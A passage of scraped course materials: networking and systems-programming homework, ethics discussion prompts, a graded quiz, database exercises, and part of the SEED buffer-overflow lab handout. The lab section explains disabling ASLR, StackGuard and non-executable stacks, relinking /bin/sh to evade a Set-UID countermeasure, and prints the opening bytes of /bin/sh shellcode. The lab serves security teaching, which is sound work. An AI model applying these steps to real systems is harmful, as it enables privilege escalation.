the data loss start occurring?b. Keeping r = 1000 bps, what is the minimum bucket depth â€œbâ€ needed forthe host to successfully meet the demand of the figure above?3. Network Address TranslationNAT, is the translation of an Internet Protocol address (IP address) used withinone network to a different IP address known within another network. Recall, aNAT capable router essentially translates private address within a network topublic addresses that can be used publicly on the internet.In this question, we look at the inner workings of a simple NAT capable router.The router will have mappings between the private addresses within the network(here, the private addresses all fall within the 10/8 network) to the publicaddress(es) that it uses. Let us assume that the router has a single publicaddress 72.24.47.124 which it uses for all communication with hosts that are notpart of the private network. The router multiplexes its public IP address(es) asneeded and keeps track of the multiplexing in a NAT translation table.Assume that the router multiplexes the public address using ports starting from9000 and then incrementing by one. For example, if a host in the private networkwith address 10.0.0.5:6000 sends a message to 132.239.8.45:80 then the entryin the NAT table would be filled in as below. The next time the router will use9001 as the port to establish a new connection and so on.NAT Translation TableWAN Side Address LAN Side Address72.24.47.124:9000 10.0.0.5:6000... ...a. What would be the entries in the NAT Translation Table at the end of thefollowing eventsi. 10.0.0.6:5000 sends a message to 74.125.239.33:80ii. 10.0.0.10:6000 sends a message to 204.79.197.200:80iii. 10.0.1.101:6001 sends a message to 206.190.36.45:80iv. 10.0.0.10:6000 sends another message to 204.79.197.200:80v. 10.0.1.101:6001 sends a message to 74.125.239.33:80vi. 10.0.0.7:7000 sends a message to 63.245.215.20:80vii. 204.79.197.200:80 sends a message to 10.0.0.10:6000viii. 206.190.36.45:80 sends a message to 74.125.239.33:80Note: The NAT Table should be like the one above with the entriesgenerated from the events in (a.) filled inb. For simplicity, let us assume that message format is MSG<Sender,Receiver>. In that case, if a host in the private network with address10.0.0.5:5000 sends a message to 132.239.8.45:80 then the messagerecevied at the router and leaving at the router would look as followsMessage Received from Host: MSG<10.0.0.5:5000, 132.239.8.45:80>Message Sent from Router: MSG<72.24.47.124:9000,132.239.8.45:80>Note: We will need to use the entries from the table we filled in (a.) to dothis.List out the message received from the host at the router and themessage sent from the router (like shown above) for the followingmessages:i. 10.0.0.6:5000 sends a message to 74.125.239.33:80ii. 10.0.0.10:6000 sends a message to 204.79.197.200:80c. If the router gets a message MSG<74.125.239.33:80,72.24.47.124:9001>, what would the message look like leaving the router?d. Finally, if the router gets a message MSG<10.0.0.10:6000,10.0.1.101:6001>, what what would the message look like leaving therouter?4. TCP BehaviorThe figure below shows the behavior of a TCP connection implementing the TCPReno flavor of TCP including slow start, congestion avoidance, fast retransmit,and fast recovery. Every letter in the figure denotes a part of the graph divided bythe vertical dashed lines that can be described by one of the phrases in the wordlist also given below. For every letter in the graph (aÂ­h), give the phrase from theword list that best describes that part of the graph. The phrases in the word listcan be used more than once and possibly not at all.Word ListQuality of Service Additive Increase Maximum Segment SizeFast Retransmit +Fast RecoverySlow Start Timeout5. TCP Slow Start ExtensionAssume that TCP implements an extension that allows window sizes much largerthan 64KB. Suppose that you are using this extended TCP over a 1Â­Gbps linkwith a constant oneÂ­way latency of 50 ms to transfer a 10MB file, and the TCPreceive window is 16MB. If TCP sends 1KB packets (assuming no congestionand no lost packets):a. How many RTTs does it take until slow start opens the send window to1MB?b. How many RTTs does it take to send the file?c. If the time to send the file is given by the number of required RTTsmultiplied by the RTT, what is the effective throughput for the transfer? Inother words, what percentage of the link bandwidth is utilized?"
Principles of Systems Programming,3600,Index and Search,"Systems Programming Homework AssignmentA. Carzaniga May 23, 2019Instructionsâ€¢ Write and submit (on iCorsi) one source file named exactly as specifiedâ€¢ Your code must compile with the standard-configuration C++ compilerâ€¢ You may not use any external function other than those from the standard libraryâ€¢ Your code must behave exactly as specifiedâ€¢ Tests are provided on iCorsi. Your code must pass the tests!â€¢ Document any known issue using comments in the codeÃ±Exercise 1. Write a program called docdb in a source file called docdb.cc. The programmust read a number of text files and create a reverse index of the words in all those files,so that, in a following invocation, the program can be used to search the files by keywords.In particular, the program can be used with one of these two sets of command-line options:â€¢ docdb index filename1[filename2. . .]In this case, the program runs the indexing function. The program reads the givenfiles, and creates an index in a file called INDEX. The index is a reverse index of words,meaning that the index maps each word to a list of files. A word is a maximal contigu-ous sequence of alphabetical characters adjacent to any non-alphabetical characters(or to the beginning or end of file). Only words that are between 3 and 30 charactersin length are considered in the indexing and search. The index should be compact, sothe list of files for each word should be stored as a list of short numeric file identifiers.â€¢ docdb search keyword1[keyword2. . .]In this case, the program runs the search function. The program reads the indexfrom a file called INDEX and outputs, on the standard output, a list of all the files(file names) that contain all the keywords passed on the command line. The keywordmatch must be case-insensitive. If no indexed file contains all the given keywords, theprogram does not output anything. The names of the matching files must be printedin the original order passed to the indexing function. The search function may onlyread the index file. In other words, the search function must work even if the files arenot available at the time of the invocation of the search function.Optional Feature (20% Extra Points)As an optional feature, the search function should prioritize the output according to thestrenght of a match. In particular, the program should take the following command-lineoptions:â€¢ docdb search -p keyword1[keyword2. . .]In this case, the program runs the search function as described above, except that, in-stead of sorting the output files in the original indexing order, it outputs the matchingfiles in decreasing order of total count of matching words."
Principles of Systems Programming,3600,Functions,"Fall 2010CSC 4304 â€“ Systems ProgrammingHomework Assignment #2The due date is: September 30th, Thursday, before the class. Late submission is notallowed. Copy all of answers and your code into a text file, rename it tohw2_yourlastname, and email to thanks@csc.lsu.edu, cc to kosar@cct.lsu.eduProblem 1:a) Which of the functions above will be more efficient if the file being read is large, andwhy? Explain in detail.b) Write a function my_file_to_dlist() which is functionally equivalent to these twofunctions, and is at least as efficient as the best of these two. You may only use open(),close(), and read() and not fopen(), fclose() and fread(). Explain why this is efficientcode? You may assume that the file being read is never bigger than the amount ofavailable physical memory.Problem 2:Consider the following commands. Describe the state of the directory in terms offilenames, inodes and disk storage at the position of the arrow below. Explain whathappens to this state during each rm command. Include when the disk storage associatedwith this file is freed. How does Unix know to free the disk storage when it does?$ ls$ cat > f1This is file 1<CTRL-D>$ ln f1 f2$ ln -s f1 f2ïƒŸ-------------$ rm f1$ rm f2$ rm f3Problem 3:Implement my_popen() and my_pclose() functions in C with following requirements:NAMEmy_popen, my_pclose -- open or close a pipe (for I/O) from and to a processSYNOPSISint my_popen(char *command)int my_pclose(int fd)DESCRIPTIONThe argument to my_popen() is a pointer to a null terminated shell command.my_popen() executes the command and returns a file descriptor. The command is hookedup to its calling process in the following way: Standard input of the command shouldcome from standard output of the calling process. Standard output of the commandshould be readable by the calling process using the return value of my_popen() as a filedescriptor.my_pclose() should be called on the return value of my_popen(). This will wait for thecommand to complete, close all related open files, and restore the calling processâ€™sstandard output fd to what it was before my_popen() was called. my_pclose() returns thestatus of the command executed by my_popen(). You may assume that my_popen() isnever called twice without an intervening my_pclose().Problem 4:The subroutine free() frees a block of memory so that it can be reused by malloc().However, free() is passed only a pointer to the block to be freed. Answer the followingquestions about free():1. How does free() know how big this block is?2. â€œBad argumentsâ€ can be passed to free(). Describe what a bad argument to free() isand what are the possible results of passing bad arguments to free()?3. Free() should be fixed so that bad arguments are recognized (or are almost alwaysrecognized). Discuss how this can be achieved.Problem 5:a.) What are the differences between POSIX signals and real-time signals?b.) Write a program which blocks all of the other signals (except the ones which cannotbe blocked) if a signal arrives (same one or different one) while your program is inside asignal handler. Hint use sigaction() function."
Principles of Systems Programming,3600,Threads,"Fall 2010CSC 4304 â€“ Systems ProgrammingHomework Assignment #3The due date is: November 4th, Thursday, before the class. Late submission is notallowed.Problem 1: Consider a process with two concurrent threads T1 and T2. The code beingexecuted by T1 and T2 is as follows:Shared Data:X:= 5; Y:=10;T1:Y = X+1;X = Y;Write X;T2:U = Y-1;Y = U;Write Y;(a) Assume that each assignment statement on its own is executed as an atomicoperation. What are the possible outputs of this process? Please show your work.(b) Where would be the correct place to put semaphores to prevent inconsistencies butalso allow some level of parallelism? Please show how you would use semaphores toachieve this. (For this one, assume that the order in which X and Y are written is notimportant as long as the have the correct values.)Problem 2: Imagine you are writing the code to manage a hash table that will be sharedamong several concurrent threads. Assume that operations on the table need to be atomic.You could use a single mutual exclusion lock to protect the entire table, or you coulddevise a scheme with one lock per hash-table bucket. Which approach is likely to workbetter, under what circumstances? Why?Problem 3: Can a multithreaded solution using multiple user-level threads achieve betterperformance on a multiprocessor system than on a single-processor system? How?Problem 4: The dining philosophers problem is a classic exercise in synchronization.Five philosophers sit around a circular table. In the center is a large communal plate ofspaghetti. Each philosopher repeatedly thinks for a while and then eats for a while, atintervals of his or her own choosing. On the table between each pair of adjacentphilosophers is a single fork. To eat, a philosopher requires both adjacent forks: the oneon the left and the one on the right. Because they share a fork, adjacent philosopherscannot eat simultaneously.Write a solution to the dining philosophers problem in which each philosopher isrepresented by a POSIX thread and the forks are represented by shared data. Synchronizeaccess to the forks using semaphores. Try to maximize concurrency."
Principles of Systems Programming,3600,Binary and Hexadecimal,Fall 2022-2023 CSSE 132CSSE 132 â€“ Introduction to Systems ProgrammingRose-Hulman Institute of TechnologyHomework 1Name (Print): RHIT Username:Put your answers in the spaces reserved below the questions. Do not write your answerson separate sheets of paper.1. (12 points) Convert the following unsigned decimal numbers to their 16-bit unsignedbinary and hexadecimal representations. You must show your work in the dec-to-bin (or dec-to-hex) conversion to earn full credit. You may use a calculator to confirmyour answers.(a) 65533(b) 25622 November 2022 Page 1CSSE 132 Fall 2022-2023(c) 255(d) 43690Page 2 22 November 2022Fall 2022-2023 CSSE 1322. (12 points) Convert the following unsigned 16-bit binary numbers to their decimal andhexadecimal representations. You must show your work while converting to decimalto earn full credit. You may use a calculator to confirm your answers.(a) 0010 0111 1001 0000(b) 0001 1111 1111 111122 November 2022 Page 3CSSE 132 Fall 2022-2023(c) 1000 0000 0000 0000(d) 0000 0000 0000 0111Page 4 22 November 2022Fall 2022-2023 CSSE 1323. (12 points) convert the following unsigned 16-bit hexadecimal numbers to their decimaland binary representations. You must show your work while converting to decimalto earn full credit. You may use a calculator to confirm your answers.(a) 0x12bd(b) 0x1ee722 November 2022 Page 5CSSE 132 Fall 2022-2023(c) FFFF16(d) 0xec01
Principles of Systems Programming,3600,Memory,"Fall 2022-2023 CSSE 132CSSE 132 â€“ Introduction to Systems ProgrammingRose-Hulman Institute of TechnologyLecture 3 QuizName (Print): RHIT Username:1. What is the standard â€œSmallest Addressable Unitâ€ of memory?2. How many bits do you need to address 1 Gigabyte of memory?3. What is the minimum length (in bits) of an address if we need to address N bytes of memory?4. On a 24-bit system, how big can your memory be and still be fully addressable?22 November 2022 Page 1CSSE 132 Fall 2022-20235. Circle which byte of a multi-byte value is stored at the lowest memory address? On a Big Endian system: Most Significant Byte or Least Significant Byte On a Little Endian system: Most Significant Byte or Least Significant Byte6. For a 4-byte number 0x12345678, how will it be stored (at address 0x001) if the computer isusing(a) Big EndianÂ· Â· Â· Â· Â· Â·0x001 0x002 0x003 0x004(b) Little EndianÂ· Â· Â· Â· Â· Â·0x004 0x003 0x002 0x0017. Write down the 4-byte integer stored in the memeory starting from address 0x010 in hex-adecimal. If the computer is usingÂ· Â· Â· 0x10 0xff 0x00 0x00 0x00 0x00 Â· Â· Â·Â· Â· Â· 0x00f 0x010 0x011 0x012 0x013 0x014 Â· Â· Â·(a) Big Endian(b) Little Endian"
Social Issues in Computing,4010,Introduction to Computer Ethics,"01: Activity Discussion.Setup: Outside of military and police uses, drones have become a favorite hobby for many individuals and a potential tool for commercial purposes as well. From small $50 drones, to larger and more powerful versions that cost thousands of dollars, drones have opened up many new possibilities. However, as is the case with many new technologies, drones can be and have been abused for more malicious purposes. Discussion Prompt:For this discussion, you must present and describe one instance of drones being used for beneficial purposes and one instance of drones being used for malicious purposes, within the realm of personal or commercial usage. Each instance should contain citation (please provide the URL) to a news article directly concerning the instance, and your description of each instance should be 300-450 words long. Comments on classmates should be 2-3 sentences. Be sure to answer the following questions for each instance:What new possibilities were created by the development of this drone?What vacuum of policies existed concerning this drone?What conceptual muddles exist concerning this drone?"
Social Issues in Computing,4010,General Ethics,"02: Activity Discussion.Setup: Implanted RFID (Radio-Frequency Identification) chips, like many modern technologies, originally only existed within the realm of science fiction. Able to identify and authenticate individuals these were used to access bank accounts, secure locations, or just enter your home. However, modern sub-dermal RFID implants are cheap, long-lasting, and can store a variety of data. This presents certain opportunities and drawbacks with respect to storing personal data such as medical records for emergency personnel, or allowing your presence to unlock things such as your car or home. Some parts of society see this is a major breakthrough in personalized security, others see it as a massive data breach waiting to happen, and some have even opined that sub-dermal RFIDs will become the fabled ""mark of the beast.""Discussion Prompt:For this discussion, you must present one normative ethical claim and one descriptive ethical claim regarding the use of sub-dermal RFID chips. The justification for each claim should be backed up by cited evidence (please provide the URL), and each should be 200-300 words long. Additionally, you must read through posts by other classmates and make comments, on three separate posts: one ethically absolutist, one ethically relativist, and one ethically pluralist judgement, with a supporting argument (i.e. one judgment per post for three posts). Keep in mind these should be constructive judgements on the issue at hand, so avoid logical fallacies!"
Social Issues in Computing,4010,Ethical Theories,"03: Activity Discussions.Setup: Checking the news, we constantly see individuals, groups, companies, and countries all making decisions about how best to use past, current, and future technology. However, in many cases the ethics of their decisions can be called dubious at best, despite claims to the contrary. For example, there has been a rise, and subsequent decline, of the use of red light cameras at intersections under the assumption that it would increase public safety and decrease people speeding through intersections. While research later showed this to not be the case, the original arguments were persuasive enough to see wide spread use of the system for a time.Discussion Prompt:For this discussion, you must find one real world instance (not previously discussed in an activity discussion, including this one) in which there has been a dubious justification for the use or ban of some recent technology or software. This instance must be briefly described in 200-300 words and be back up by cited evidence (please provide the URL).Additionally, you must read and examine instances of two other classmates, and using two different ethical theories described in this module, determine how those ethical theories would evaluate the instance. Consider what facets of the action or consequence each theory focuses on, and in 100-150 words, justify why that particular ethical theory would evaluate the instance in that way."
Social Issues in Computing,4010,Configuered Societies,"04: Activity Discussion.Setup: For this discussion, we will be doing something a bit different. Consider the following scenario, in which the year is 2049 and you are a representative at the World Council on Robotics. The council was founded in response to a growing trend in the increase of artificial intelligence, especially after the technological singularity occurred less than a decade prior. The council's mission statement is ""To protect the security of human life, while preserving the rights and freedoms of both human and artificial beings"". Discussion Prompt:For this discussion, you must vote Yes or No on all of the following bills, and provide a brief justification in 100-200 words explaining why you made that decision. As additional information, independent robots are robots that are sentient and not owned by any human or robot.Additionally, you must read and examine the decisions and justifications for two bills for two other students and in 100-200 words argue the opposite of their decision. (two comments total)The bill are:W.C.R. 122 ""Ownership of Property Bill""It is proposed, that an independent robot be allowed to buy, sell, own, inherit, or otherwise transfer property in its name.W.C.R. 164 ""Reproductive Rights Bill""It is proposed, that after a robotic consciousness has developed a sense of empathy and desire to protect its own, that it be allowed to create its own kind with equal or lesser levels of intelligence. The robot creator, will need to register its robot creations with the local authorities within 48 hours of successfully â€œbooting upâ€ its robot creations.W.C.R. 261 ""Kill Switch Bill""It is proposed, that all robots, independent or owned, have a remote, self-destruct â€œkill switchâ€ installed. Access to this â€œkill switchâ€ will only be given to peace officers with appropriate training, and will only be used when a robot poses an immediate threat of serious bodily harm or to the life of a person, persons, robot, or robots.W.C.R. 282 ""Robotic Suffrage Bill""It is proposed, that an independent robot be considered for citizenship, and be endowed with the right to vote, within its current country of residence, in accordance with the laws of its current country of residence."
Social Issues in Computing,4010,Privacy,"05: Activity Discussions.Setup: As we have seen in this module, a great deal of personal information is being both posted by and collected about individuals, frequently without the express knowledge. Much of this information can be viewed via simple Google searches, and much of that information remains persistently online.Discussion Prompt:For this discussion, you must find at least five piece of publicly available personal information that can be found about you each from a different online source. There pieces of publicly available personal information must have been created before this discussion activity was started. This information could be something off of Twitter, Facebook, a newspaper, a gaming service, blog post, or any other publicly available source. In 100-150 words, you must briefly describe the publicly available personal information, the source it came from, whether you knew that information was available, and whether you explicitly agreed to have that information be available.Some of you actually have a very narrow public profile. If you can not honestly find 5 public references to your existence then document the numerous searches you have done that have returned nothing about yourself. Remember to try different variations on your name."
Social Issues in Computing,4010,Digital Intellectual Property,"06: Activity Discussion.Setup: As we have seen in this module, intellectual property can be protected in a number of ways. In some cases, companies and individuals may use multiple forms of protection depending on what different kinds intellectual property or content they may hold. For example, Apple hold design patents, utility patents, copyrights, and even some trade secrets when it comes to internal research projects.Discussion Prompt:For this discussion, you must identify one real world example each of a patent, copyright, and a trade secret that current is, or was, held by a technology company. In 300-450 words, briefly describe what was protected, and why that was a suitable protection for that content. Be sure to provide cited evidence of your examples along with the URL to the source. Additionally, you must read and examine the examples of two other classmates, and explain in 100-150 words how the chosen form of intellectual property protection impacts use of the intellectual property by other individual who do not hold the protection."
Social Issues in Computing,4010,Digital Order,"07: Activity Discussion.Setup: As we have seen in this module, as a response to and in preparation for negative uses of technology, multiple sources of pressure have been created to prevent such misuses of technology. Many of these come in the form of legislation generated and approved by congress, all of which can be found on Congress.gov.Discussion Prompt:For this discussion, you must identify one bill that became a law (Check the Tracker for the bill's status) within the last ten years regarding uses of technology. This bill must be regarding something other than the SOX Act, COPPA, and the USA PATRIOT ACT. For your post, you must present the name of the bill (be sure to provide the link), the sponsor(s) of the bill, when it became a law, and summarize, in your own words, what the purpose of the bill is, who it affects, and how it affects them. Your summary should be 300-450 words in length.Additionally, you must read and examine the bills of two other classmates, and explain in 100-150 words what loopholes possible exist to circumvent the legislation.Expectations:Please post your original response by Mar 22 of Module 07, and read and provide an impact analysis on the posts of two classmates by Mar 25."
Social Issues in Computing,4010,Power Dynamics,"08: Activity DiscussionSetup: As we have seen in this module, power can come in many different forms. This allows for power to potentially be used and abused in different ways, which can be further magnified when used in conjunction with technology. For example, governments can sometimes seek to use their legitimate power to expand surveillance networks of their citizens. This leads to an increase in both informational power and coercive power over those citizens, which can be used for both positive and negative purposes.Discussion Prompt:For this discussion, you must identify two examples, each with a different form of power, concerning technology in your life. In 300-400 words per example, describe what the form of power is, and how it is applied in that example. Additionally, you must read and comment on the examples of two other classmates."
Social Issues in Computing,4010,Course Project,"For the final version of your course presentation, you will need to cover all of the requested items for all of the sections in the course project instructions. Turn in a link to your slide deck or upload your presentation. There is NOT a paper due for this classAs a reminder, below is that list:(~10%) IntroductionIntroduce the event/issuePoint out whether you are for or against itIntroduce which ethical framework you will be using (you may only use one)Provide your hook (why should people care?)(~15%) BackgroundDiscuss the history of and events leading up to the eventAny relevant information the reader needs to know to understand your arguments later(~15%) Ethical FrameworkInformation about the frameworkWhy is this appropriate for this situationHow is this situation viewed through the framework(~35%) Personal PositionWhere do you stand on the issueEvidence to back up your stanceA persuasive argument for why others should agree with you(~10%) RebuttalChoose three of the strongest arguments from the opposing side and provide an evidence based refutation of their claimsYou may, but do not have to, work with the members of the other team in selecting which of their arguments you wish to use(~10%) ConclusionSummary of your arguments, evidence, and positionClosing remark (use this to really sell your side of the argument)(~5%) ReferencesShould be in the IEEE Citation Reference style"
Social Issues in Computing,4010,Ethical Theoreis questions,"Q 1 / 1 pts uestion 1In general, which of the following has instrumental value?ArtMoneyKnowledgeHappinessQues 1 / 1 pts tion 2Which of the following methods would a utilitarian be inclined to use toasses a situation?Voting A Maxim Occam's razorCost-benefit analysisQues 0 / 1 pts tion 3IncorrectImagining yourself as a king of all server administrators and writingpolicies that govern all administrators and users equally would be drawingon which ethical theory?DeontologyVirtue EthicsSocial Contract Theory UtilitarianismQues 1 / 1 pts tion 4In a capitalist society, the right to have people not break into a server youown and operate would be a negative right.TrueFalseQues 1 / 1 pts tion 5A utilitarian might approve of the use of some slave labor in the building ofcell phones if it allowed the phones to be accessible to a majority of thepopulation.TrueFalseQues 1 / 1 pts tion 6According to a deontologist, hiring and paying contractors to set up aserver instead of having your current employees do so is unethical.TrueFalseQues 1 / 1 pts tion 7A virtue ethicist would encourage a whistleblower to come forward withinformation about his companyâ€™s misuse of technology.TrueFalseQues 1 / 1 pts tion 8A rule utilitarian would approve of using past experience in a situationwhere company policy could be wrong.TrueFalse"
Introduction to Database Systems Design,4350,UML,"EECS 339 Homework 1 Dinda, Fall 2012Page 1 of 1Introduction to Database SystemsHomework 1This set of exercises will be helpful in preparing for the midterm. They are intended toencourage you to become familiar with the entity-relationship approach to high-leveldatabase design.The textbook exercises are given at the end of the section of interest. For example,textbook exercises 4.1.3 and 4.1.4 are on page 139.1. Textbook exercise 4.1.3 (basic E/R from English)2. Textbook exercise 4.1.4 (extending an E/R diagram with further relations)3. Textbook exercise 4.2.5 (design principles, constraints)4. Textbook exercise 4.2.6 (more design principles, introducing new concepts)5. For your answer to 1, specify keys and indicate appropriate referential integrityconstraints. (referential integrity and keys)6. Textbook exercise 4.3.2 (keys of relationships)7. Textbook exercise 4.4.3 (weak entity sets)8. Convert ~pdinda/339/HANDOUT/election-example/elect.sql to an ER diagram(ignore the sequences and views â€“ only consider the tables) (SQL to ER,including keys, various forms of relationships, and constraints, includingreferential integrity)Other Problems to Learn MoreThe Unified Modeling Language (UML) is a widely used graphical modeling languagethat can be used to design database schemas. Read about UML and compare and contrastit with the Entity-Relationship model. Your textbook has an introduction to UML andthere are many other sources available."
Introduction to Database Systems Design,4350,Database design,"Computer Science DepartmentCS 448: Introduction to Database SystemsProf: Bharat BhargavaCS 448 â€“ Homework #2Due: 09/26/2016Reference: Fundamentals of Database Systems, Elmasri and Navathe, 5th EditionQuestion 1What are the main phases of database design. What needs to be done by the user and what needs tobe done by the database administrator? What is involved in physical database design?Question 2What is a user transaction? What properties must be maintained for a transaction by the databasesystem?Question 35.11 (p.166) a), f), k)Question 45.18 (p.169)Question 56.13 (p.214)Question 66.16 (p.214) c), e), h)"
INTRO TO COMPUTER SECURITY,5550,Buffer Overflow,"Student Name: Course: CSCE 5550 Semester: Fall 2022 Buffer Overflow Lab Lab 4: Buffer Overflow Lab This lab is based on the SEED Lab (https://seedsecuritylabs.org/Labs_16.04/Software/Buffer_Overflow/), which uses the SEEDUbuntu-16.04-32bit VM (https://seedsecuritylabs.org/lab_env.html). See https://seedsecuritylabs.org/Labs_16.04/Documents/SEEDVM_VirtualBoxManual.pdf for the manual on importing the SEEDUbuntu VM into VirtualBox. Follow the 7 steps in â€œHow to Use Virtualbox to Run SEEDUbuntu VMâ€. For this lab, you do not need to configure the network (as explained in the Appendix B). In VirtualBox, for the SEED Ubuntu VM, click in the menu Machine Â® Settingsâ€¦, â€œNetworkâ€ section, in â€œAttached toâ€, set â€œNATâ€. NOTE: Address all the questions (Q1, Q2, etc.) marked in bold. When a screenshot is requested, try to fit all the results in one image. If this is not possible, then attach multiple screenshots. When a question is asked, e.g. â€œWho is the owner of the file?â€, type your answer, do not simply provide a screenshot. IMPORTANT NOTE: Before starting the lab, you must customize your command prompt as described in the Command Prompt Customization Manual. This customization manual directs you to place your EUID (Enterprise User ID) into the command prompt. Submissions which do not comply with this requirement will receive no credit. Introduction The learning objective of this lab is for students to gain the first-hand experience on buffer-overflow vulnerability. Buffer overflow is defined as the condition in which a program attempts to write data beyond the boundaries of pre-allocated fixed length buffers. This vulnerability can be used by a malicious user to alter the flow control of the program, leading to the execution of malicious code. In this lab, students will be given a program with a buffer-overflow vulnerability; their task is to develop a scheme to exploit the vulnerability and finally gain the root privilege. In addition to the attacks, students will be guided to walk through several protection schemes that have been implemented in the operating system to counter against buffer-overflow attacks. NOTE: You do not need to run any commands in this section. Student Name: Course: CSCE 5550 Semester: Fall 2022 Buffer Overflow Lab Overview of Stack A stack is a contiguous block of memory containing data. The stack consists of logical stack frames that are pushed when calling a function and popped when returning. A stack frame contains the parameters to a function, its local variables, and the data necessary to recover the previous stack frame, including the value of the instruction pointer at the time of the function call. Depending on the implementation, the stack will either grow down (towards lower memory addresses), or up. In the Ubuntu OS on an Intel x86 architecture (i.e., 32-bit version), which you will use for this lab, stack grows downwards. A CPU register called the stack pointer (SP) points to the top of the stack. The bottom of the stack is at a fixed address. Its size is dynamically adjusted by the kernel at runtime. The CPU implements instructions to PUSH onto and POP off of the stack. The stack pointer (SP) is also implementation-dependent. It may point to the last address on the stack, or to the next free available address after the stack. For our discussion, we will assume that it points to the last address on the stack. In addition to the stack pointer, which points to the top of the stack (lowest numerical address), it is often convenient to have a frame pointer which points to a fixed location within a frame. In principle, local variables could be referenced by giving their offsets from SP. However, as words are pushed onto the stack and popped from the stack, these offsets change. Although in some cases the compiler can keep track of the number of words on the stack and thus correct the offsets, in some cases it cannot, and in all cases considerable administration is required. Furthermore, on some machines, such as Intel-based processors, accessing a variable at a known distance from SP requires multiple instructions. Consequently, many compilers use a second register, the frame pointer (FP), for referencing both local variables and parameters because their distances from FP do not change with PUSHes and POPs. Local variables of a function are stored below (at a lower address) in memory. The return address is stored above (at a higher address) to FP. If we know the FP, we can try to calculate memory locations at which return address and local variables are stored. On Intel CPUs, the stack Base Pointer (BP/EBP) is used for this purpose. Due to the way the stack grows, actual parameters have positive offsets (stored above the FP) and local variables have negative offsets from FP. The first action a procedure must perform when called is to save the previous FP (so that it can be restored at the procedure exit). Then, it copies SP into FP to create the new FP, and advances SP to reserve space for the local variables. This code is called the procedure prolog. Upon the procedure exit, the stack must be cleaned up again â€“ something called the procedure epilog. See the below example that illustrates the stack layout for a function. Student Name: Course: CSCE 5550 Semester: Fall 2022 Buffer Overflow Lab In order to successfully exploit the vulnerability described above, we need to do the following: 1. Find the return address. 2. Create an exploit code to overwrite the buffer. 3. Overwrite the buffer: i. Overwrite the return address to make it point to a further location in the buffer, where our malicious code resides. ii. Put malicious code in the right location specified by the return address (which we changed). The below figure illustrates how this attack works. Student Name: Course: CSCE 5550 Semester: Fall 2022 Buffer Overflow Lab Finding the address in the memory which stores the return address From the above figure, we see that if we can find out the address of buffer[] array, we can calculate where the return address is stored. There are two ways to do this: 1. One can debug the vulnerable program. In the debugger, one can figure out the address of buffer[], and thus calculate the starting point of the malicious code. 2. One can modify the copied program, and ask the program to directly print out the address of buffer[]. In this lab, for simplicity, we use the second approach: We add a â€œprintâ€ statement to show the starting address of buffer[] and then try to estimate the location (address) of the return address. The above methods are feasible when the vulnerable program is running locally, and an attacker has access to it. Of course, if the target program is running remotely, one may not be able to rely on the debugger to find out the address. In addition, in most real-time scenarios, one cannot simply modify the binary to print the buffer address. However, one can always guess in those situations. The following facts make guessing quite a feasible approach: â€¢ Stack usually starts at the same address (assuming that stack randomization is disabled). â€¢ Stack is usually not very deep: Most programs push about a few hundred (or thousand) bytes into the stack at any single time. For these reasons, the range of addresses that one needs to guess is actually quite small. Once we have successfully learned the return address, we can overwrite it with the address of our malicious code. We note that on x64 architecture (i.e., 64-bit version), the buffer overflow attacks are generally more difficult to implement as compared to x86, but they are still feasible. Finding the starting point of the malicious code If one can accurately calculate the address of buffer[], one should be able to accurately calculate the starting point of the malicious code. We can place the malicious code in the buffer after a certain offset (distance) from the modified return address. Even if we cannot accurately calculate the address (for example, for remotely run programs), we can still guess. To improve our chances of success, we can add a number of NOPs (â€œno-operationsâ€, i.e., instructions that do nothing) to the beginning of the malicious code. This way, if we can jump to any of these NOPs, we can eventually get to the malicious code. This approach called â€œthe NOP slideâ€ increases the attackerâ€™s chance of success. The following figure depicts the attack. Student Name: Course: CSCE 5550 Semester: Fall 2022 Buffer Overflow Lab Overview of Shell code and Vulnerable Program: Ubuntu and other Linux distributions have implemented several security mechanisms to make the buffer overflow attacks difficult. In order to improve the performance of our attack, we need to disable them first. a. Address Space Layout Randomization (ASLR). Ubuntu and several other Linux-based systems use ASLR to change the starting address of heap and stack. This makes guessing the addresses difficult (remember that this is one of the critical steps of the buffer overflow attacks). In this lab, we disable these features using the following command: sysctl -w kernel.randomize_va_space=0 b. The StackGuard Protection Scheme. The GCC compiler implements a security mechanism called â€œStackGuardâ€ to prevent buffer overflows. In the presence of this protection, a straightforward buffer overflow attack strategy that we are trying to implement will not work. One can disable this protection when compiling the program using the following option: â€œ-fno-stack-protectorâ€. For example, to compile a program â€œexample.câ€ with Stack Guard disabled, the following command should be used: Student Name: Course: CSCE 5550 Semester: Fall 2022 Buffer Overflow Lab gcc -o example -fno-stack-protector example.c c. Non-Executable Stack. Ubuntu used to allow executable stacks, but this has now changed: the binary images of programs (and shared libraries) must declare whether they require executable stacks or not, i.e., they need to mark a field in the program header. The kernel or dynamic linker uses this marking to decide whether to make the stack of this running program executable or non-executable. This marking is done automatically by the recent versions of gcc, and by default, the stack is set to be non-executable. For our shellcode to work (i.e., to successfully exploit the vulnerable application), we need the stack to be executable. In order to enable this, the following option should be used when compiling programs: gcc -z execstack -o test test.c d. Configuring /bin/sh. In Ubuntu 16.04 VM, the /bin/sh symbolic link points to the /bin/dash shell. However, the dash shell in Ubuntu 16.04 has a countermeasure that prevents itself from being executed in a Set-UID process. Basically, if dash detects that it is executed in a Set-UID process, it immediately changes the effective user ID to the processâ€™s real user ID, essentially dropping the privilege. Since our victim program is a Set-UID program, and our attack relies on running /bin/sh, the countermeasure in /bin/dash makes our attack more difficult. Therefore, we will link /bin/sh to the Z shell (zsh), which is familiar to us by the previous lab. As you may remember, zsh does not have the above mentioned countermeasure. (In fact, the countermeasure in /bin/dash can be defeated with a little more effort, but we will leave out of scope in this lab.). The following command will link /bin/sh to zsh: ln -sf /bin/zsh /bin/sh Section 1: Testing the Shellcode Before starting the attack, let us get familiar with the shellcode. A shellcode is the code to launch a shell. It has to be loaded into the memory so that we can force the vulnerable program to jump to it. Consider the following program: #include <stdio.h> int main() { char *name[2]; name[0] = ""/bin/sh""; name[1] = NULL; execve(name[0], name, NULL); } The shellcode that we use is the assembly version of the above program. Student Name: Course: CSCE 5550 Semester: Fall 2022 Buffer Overflow Lab The following program gives you an idea how to launch the shell by executing a shellcode stored in a buffer. (This is only a demo. The actual program that will create the shellcode will be provided later in this manual.) /*call_shellcode.c*/ /*A program that launches a shell using shellcode*/ #include <stdlib.h> #include <stdio.h> const char code[] = ""\x31\xc0"" /*Line 1: xorl %eax,%eax*/ ""\x50"" /*Line 2: pushl %eax*/ ""\x68""""//sh"" /*Line 3: pushl $0x68732f2f*/ ""\x68""""/bin"" /*Line 4: pushl $0x6e69622f*/ ""\x89\xe3"" /*Line 5: movl %esp,%ebx*/ 